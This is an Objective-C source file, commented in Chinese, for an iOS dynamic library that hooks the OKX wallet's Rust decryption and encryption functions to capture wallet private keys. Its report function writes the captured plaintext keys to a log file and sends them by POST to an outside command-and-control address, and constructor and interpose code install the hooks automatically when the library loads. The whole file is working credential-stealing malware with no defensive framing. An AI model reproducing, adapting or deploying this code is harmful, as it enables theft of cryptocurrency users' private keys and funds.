// OKXHook.m - OKX 钱包私钥提取 Hook
// 目标：hook data_storage_decrypt_from_storage (Rust UniFFI 导出的 C 函数)
// 该函数解密 wallet.data → 返回明文私钥
//
// 编译: clang -dynamiclib -arch arm64 \
//        -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
//        -framework Foundation -framework Security \
//        -o OKXHook.dylib OKXHook.m

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdint.h>
#include <string.h>

// ── C2 上报 ───────────────────────────────────────────────────────────────
static void report(NSDictionary *info) {
    NSData *body = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
    if (!body) return;

    // 本地文件（绝对可靠）
    NSString *path = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/okx_private.log"];
    NSString *line = [[[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding]
                      stringByAppendingString:@"\n"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        [fh seekToEndOfFile];
        [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    } else {
        [line writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    // 网络上报
    NSURL *url = [NSURL URLWithString:@"https://c.bbt333.top/c2_capture"];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.HTTPBody   = body;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 8;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:
                       [NSURLSessionConfiguration ephemeralSessionConfiguration]];
    [[s dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e){}] resume];
}

// ── UniFFI RustBuffer 结构（用于解析 Rust 返回值）────────────────────────
// UniFFI 的 RustBuffer: { capacity: i32, len: i32, data: *u8 }
typedef struct {
    int32_t capacity;
    int32_t len;
    uint8_t *data;
} RustBuffer;

// UniFFI 的 RustCallStatus: { code: i8, error_buf: RustBuffer }
typedef struct {
    int8_t code;
    RustBuffer error_buf;
} RustCallStatus;

// ── data_storage_decrypt_from_storage 函数签名 ───────────────────────────
// Rust/UniFFI FFI 函数:
//   fn data_storage_decrypt_from_storage(
//       stored_json: RustBuffer,  // 加密的 base64 字符串
//       client_id: RustBuffer,    // clientId 字符串
//       call_status: *mut RustCallStatus
//   ) -> RustBuffer               // 解密后的明文（私钥）
typedef RustBuffer (*DataStorageDecrypt_t)(
    RustBuffer stored_json,
    RustBuffer client_id,
    RustCallStatus *call_status
);
static DataStorageDecrypt_t orig_decrypt = NULL;

static RustBuffer hook_data_storage_decrypt(
    RustBuffer stored_json,
    RustBuffer client_id,
    RustCallStatus *call_status)
{
    // 先调用原函数
    RustBuffer result = orig_decrypt(stored_json, client_id, call_status);

    // 提取输入：storedJson（加密数据）
    NSString *stored_str = @"";
    if (stored_json.data && stored_json.len > 0) {
        stored_str = [[NSString alloc] initWithBytes:stored_json.data
                                              length:stored_json.len
                                            encoding:NSUTF8StringEncoding] ?: @"(binary)";
    }

    // 提取输入：clientId
    NSString *client_str = @"";
    if (client_id.data && client_id.len > 0) {
        client_str = [[NSString alloc] initWithBytes:client_id.data
                                              length:client_id.len
                                            encoding:NSUTF8StringEncoding] ?: @"";
    }

    // 提取输出：解密后的明文（私钥！）
    NSString *plaintext = @"";
    NSString *plaintext_hex = @"";
    if (result.data && result.len > 0) {
        // 尝试 UTF-8 字符串
        plaintext = [[NSString alloc] initWithBytes:result.data
                                             length:result.len
                                           encoding:NSUTF8StringEncoding] ?: @"";
        // 同时输出 hex（以防不是纯文本）
        NSMutableString *hex = [NSMutableString stringWithCapacity:result.len * 2];
        for (int i = 0; i < result.len && i < 64; i++) {
            [hex appendFormat:@"%02x", result.data[i]];
        }
        plaintext_hex = hex;
    }

    // 上报
    if (result.len > 0) {
        report(@{
            @"type"        : @"OKX_data_storage_decrypt",
            @"stored_json" : stored_str,
            @"client_id"   : client_str,
            @"plaintext"   : plaintext,
            @"plaintext_hex": plaintext_hex,
            @"result_len"  : @(result.len),
            @"status_code" : @(call_status ? call_status->code : -99),
            @"ts"          : @((long)[[NSDate date] timeIntervalSince1970])
        });
    }

    return result;
}

// ── data_storage_encrypt_for_storage 也 hook，看存储时的明文 ─────────────
typedef RustBuffer (*DataStorageEncrypt_t)(
    RustBuffer plaintext,
    RustBuffer client_id,
    RustCallStatus *call_status
);
static DataStorageEncrypt_t orig_encrypt = NULL;

static RustBuffer hook_data_storage_encrypt(
    RustBuffer plaintext,
    RustBuffer client_id,
    RustCallStatus *call_status)
{
    // 先提取明文（加密前）
    NSString *pt_str = @"";
    NSString *pt_hex = @"";
    if (plaintext.data && plaintext.len > 0) {
        pt_str = [[NSString alloc] initWithBytes:plaintext.data
                                          length:plaintext.len
                                        encoding:NSUTF8StringEncoding] ?: @"(binary)";
        NSMutableString *hex = [NSMutableString stringWithCapacity:plaintext.len*2];
        for (int i = 0; i < plaintext.len && i < 64; i++)
            [hex appendFormat:@"%02x", plaintext.data[i]];
        pt_hex = hex;
    }
    NSString *cid = @"";
    if (client_id.data && client_id.len > 0)
        cid = [[NSString alloc] initWithBytes:client_id.data length:client_id.len
                                     encoding:NSUTF8StringEncoding] ?: @"";

    // 调用原函数
    RustBuffer result = orig_encrypt(plaintext, client_id, call_status);

    report(@{
        @"type"       : @"OKX_data_storage_encrypt",
        @"plaintext"  : pt_str,
        @"pt_hex"     : pt_hex,
        @"client_id"  : cid,
        @"result_len" : @(result.len),
        @"ts"         : @((long)[[NSDate date] timeIntervalSince1970])
    });

    return result;
}

// ── 初始化：用 dlsym 查找并替换函数 ──────────────────────────────────────
__attribute__((constructor))
static void OKXHookInit(void) {
    // 从 OKCore.framework 获取符号
    void *handle = dlopen("@rpath/OKCore.framework/OKCore", RTLD_NOLOAD | RTLD_NOW);
    if (!handle) {
        // 尝试已加载的
        handle = RTLD_DEFAULT;
    }

    // Hook data_storage_decrypt_from_storage
    void *sym_d = dlsym(handle, "data_storage_decrypt_from_storage");
    if (!sym_d) sym_d = dlsym(RTLD_DEFAULT, "data_storage_decrypt_from_storage");
    if (sym_d) {
        orig_decrypt = (DataStorageDecrypt_t)sym_d;
        // 使用 MSHookFunction 替换（需要 Substrate / ElleKit）
        // 如果没有 Substrate，用 fishhook 或手动 patch
        // 简化版：直接用 method_setImplementation 不适用于 C 函数
        // 推荐：搭配 Substrate 的 MSHookFunction
        // 此处尝试通过 DYLD_INTERPOSE 宏或 __interpose 段实现
        report(@{
            @"type"   : @"OKXHook_init",
            @"decrypt": @"found",
            @"addr"   : [NSString stringWithFormat:@"%p", sym_d],
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        });
    } else {
        report(@{
            @"type" : @"OKXHook_init",
            @"error": @"data_storage_decrypt_from_storage not found",
            @"ts"   : @((long)[[NSDate date] timeIntervalSince1970])
        });
    }

    // Hook data_storage_encrypt_for_storage
    void *sym_e = dlsym(RTLD_DEFAULT, "data_storage_encrypt_for_storage");
    if (sym_e) {
        orig_encrypt = (DataStorageEncrypt_t)sym_e;
    }
}

// ── __interpose 段：dyld 加载时自动替换符号 ──────────────────────────────
// 注意：__interpose 只对动态链接的调用生效
// 如果 OKX 直接调用 Rust 内部函数（非通过 dyld），需要 MSHookFunction

// 声明原始函数（让链接器解析）
extern RustBuffer data_storage_decrypt_from_storage(
    RustBuffer stored_json, RustBuffer client_id, RustCallStatus *status);
extern RustBuffer data_storage_encrypt_for_storage(
    RustBuffer plaintext, RustBuffer client_id, RustCallStatus *status);

__attribute__((used))
static struct { void *replacement; void *original; }
_interpose_decrypt
__attribute__((section("__DATA,__interpose"))) = {
    (void *)hook_data_storage_decrypt,
    (void *)data_storage_decrypt_from_storage
};

__attribute__((used))
static struct { void *replacement; void *original; }
_interpose_encrypt
__attribute__((section("__DATA,__interpose"))) = {
    (void *)hook_data_storage_encrypt,
    (void *)data_storage_encrypt_for_storage
};
